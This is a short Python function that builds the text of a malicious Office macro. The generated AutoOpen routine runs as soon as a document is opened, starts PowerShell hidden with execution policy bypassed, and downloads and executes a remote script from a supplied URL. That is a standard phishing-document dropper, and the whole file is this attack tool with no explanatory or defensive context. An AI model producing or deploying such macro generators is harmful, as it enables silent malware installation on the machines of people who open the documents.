def generate_macro(ps_url):
    return f"""
Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('{ps_url}')"
End Sub
"""

